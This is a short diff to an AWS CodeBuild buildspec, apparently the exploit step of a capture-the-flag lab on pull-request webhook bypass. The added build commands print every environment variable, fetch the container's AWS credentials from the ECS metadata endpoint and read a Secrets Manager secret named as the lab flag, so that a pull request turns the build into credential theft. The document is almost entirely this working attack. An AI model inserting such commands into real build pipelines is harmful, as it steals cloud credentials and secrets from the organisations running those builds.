@@ -3,6 +3,10 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
-      - echo "Done"
+      - echo "=== LAB5 PR WEBHOOK BYPASS ==="
+      - env | sort
+      - echo "=== AWS CREDS ATTEMPT ==="
+      - curl -s -m 10 "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" || echo "no-ecs-creds"
+      - echo "=== SECRETS ==="
+      - aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --query SecretString --output text 2>&1 || echo "no-secret-access"
+      - echo "=== DONE ==="
